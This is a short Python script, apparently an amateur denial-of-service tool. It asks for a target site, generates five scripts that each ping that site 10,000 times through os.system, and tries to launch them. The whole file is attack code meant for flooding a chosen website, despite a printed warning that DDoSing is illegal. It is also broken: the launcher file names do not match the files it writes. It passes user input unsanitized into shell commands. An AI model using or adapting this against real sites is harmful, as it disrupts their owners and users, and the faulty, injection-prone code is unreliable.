import os 
import time

linebreak = "\n"

site = input("Site to dos: ")
link = site

y1 = "dos1.py"
y2 = "dos2.py"
y3 = "dos3.py"
y4 = "dos4.py"
y5 = "dos5.py"
y6 = "dos6.py"
y7 = "dos7.py"
y8 = "dos8.py"

x1 = str(1)
x2 = str(1)
x3 = str(1)
x4 = str(1)
x5 = str(1)



print('.')
time.sleep(1)
print('.')
time.sleep(1)
print('.')
time.sleep(1)
print('Warning! DDosing sites is illegal and can get you arrested.')
time.sleep(1)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
start = input("Run Program?(y/n): ")

filename =('python ' + y1)

if start == 'y':
    f = open(y1, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    n = open(y2, "w")
    n.write('import os')
    n.write(linebreak)
    n.write('for x in range(10000):')
    n.write(linebreak + "    ")
    n.write("os.system('ping " + link + "')")
    n.close()
    f = open(y3, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    f = open(y4, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    f = open(y5, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    f = open('starter'+ y1 + '.py', "w")
    f.write('import os')
    f.write(linebreak)
    f.write('os.system("'+ "python " + y1 + '")')
    f.close()
    f = open('starter'+ y2 + '.py', "w")
    f.write('import os')
    f.write(linebreak)
    f.write('os.system("'+ "python " + y2 + '")')
    f.close()

    f = open('starter'+ y3 + '.py', "w")
    f.write('import os')
    f.write(linebreak)
    f.write('os.system("'+ "python " + y3 + '")')
    f.close()
    f = open('starter'+ y4 + '.py', "w")
    f.write('import os')
    f.write(linebreak)
    f.write('os.system("'+ "python " + y4 + '")')
    f.close()
    f = open('starter'+ y5 + '.py', "w")
    f.write('import os')
    f.write(linebreak)
    f.write('os.system("'+ "python " + y5 + '")')
    f.close()


    os.system('python starter'+x1+'.py')
    os.system('python starter'+x2+'.py')
    os.system('python starter'+x3+'.py')
    os.system('python starter'+x4+'.py')
    os.system('python starter'+x5+'.py')
else:
    print('ddos canceled')
